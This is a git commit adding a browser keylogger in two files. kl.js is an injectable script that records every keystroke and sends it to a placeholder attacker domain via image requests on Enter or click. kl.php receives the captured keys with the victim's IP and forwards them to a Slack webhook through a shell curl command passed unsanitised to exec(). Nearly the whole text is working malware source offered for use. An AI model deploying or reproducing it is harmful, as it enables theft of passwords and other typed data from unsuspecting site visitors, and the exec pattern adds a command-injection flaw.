3bd8550c991b4bae883282220eaa3b6b6ab7ad51
Curtis Brazzell <curtbraz@gmail.com>
2018-08-30 01:43:05 -0400

    Add files via upload

---
+++ kl.js
@@ -0,0 +1,31 @@
+<SCRIPT>
+// Enter URL to "kl.php" API Here
+var url = 'http://YOUR_DOMAIN_HERE/kl.php?key='
+var array = [];
+
+// Pushes Keystrokes to Array
+document.onkeypress = function(keypress) {
+    var stroke = keypress.key;
+    array.push(stroke);
+}
+
+// When Enter/Return Key is Pressed, Send Array to PHP API
+window.setInterval(function() {
+    if (array[array.length-1] == 'Enter') {
+        var command = encodeURIComponent(JSON.stringify(array));
+        new Image().src = url + command;
+        array = [];
+    }
+}, 100);
+
+// If Mouse is Clicked, Send Array to PHP API
+document.body.addEventListener('click', function(){
+        if(array.length > 0){
+		array.push("Click")
+		var command = encodeURIComponent(JSON.stringify(array));
+        new Image().src = url + command;
+        array = [];}
+}, true); 
+</SCRIPT>
+
+
---
+++ kl.php
@@ -0,0 +1,35 @@
+<?php
+
+// Update These Values
+$Slack_Webhook_URL = "https://hooks.slack.com/services/YOUR_SLACK_WEBHOOK_URL_HERE";
+$Slack_Channel = "#keylogger";
+
+// Grab IP Address of the Client
+$IP = $_SERVER['REMOTE_ADDR'];
+
+// Accept "key" Parameter From Injected JavaScript
+if(isset($_REQUEST['key'])){$key = $_REQUEST['key'];
+
+// Format the Text
+$keyarray = explode(',',$key);
+
+$text = "";
+
+$arraylength = count($keyarray) - 1;
+
+$i = 0;
+
+while($i < $arraylength){
+$keyarray[$i] = trim($keyarray[$i], '[');
+$keyarray[$i] = trim($keyarray[$i], '"');
+$text = $text.$keyarray[$i];
+$i = $i + 1;
+}
+
+// Post to Slack Channel
+$cmd4 = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$Slack_Channel.'", "username": "Keylogger ('.$IP.')", "text": "'.$text.'", "icon_emoji": ":keyboard:"}\' '.$Slack_Webhook_URL;
+exec($cmd4);
+
+}
+
+?>
